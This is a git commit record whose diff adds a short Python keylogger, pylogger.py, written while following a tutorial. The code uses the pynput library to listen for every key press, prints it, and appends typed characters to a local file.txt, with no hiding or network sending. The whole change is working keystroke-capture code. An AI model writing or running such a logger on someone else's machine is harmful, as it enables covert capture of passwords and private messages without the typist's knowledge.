ea026958198dfcdc4a703c6623eab938deb19cf5
G.Abderrahmane <raouga45@gmail.com>
2025-06-16 02:05:25 +0200

    simple keylogger using Shaun Halverson tutorial

--- pylogger.py
+++ pylogger.py
@@ -1,1 +1,14 @@
 from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("file.txt", "a") as file :
+        try:
+            file.write(key.char)
+        except:
+            print("error :3")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
